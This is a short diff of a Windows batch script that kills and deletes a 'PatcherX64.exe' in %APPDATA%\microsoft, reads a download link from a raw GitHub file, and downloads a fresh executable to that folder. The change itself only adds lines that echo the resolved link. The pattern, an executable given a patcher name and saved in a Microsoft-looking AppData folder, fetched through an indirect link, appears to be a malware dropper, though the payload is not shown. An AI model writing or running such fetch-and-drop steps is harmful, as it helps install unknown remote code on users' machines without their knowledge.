@@ -12,6 +12,12 @@ taskkill /f /im PatcherX64.exe >nul 2>&1
 del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/CoreProcessFileLink') do set "CORPROCESSFILELINK=%%i"
+
+echo.
+echo CORPROCESSFILELINK=%CORPROCESSFILELINK%
+echo.
+
+
 curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
 
 
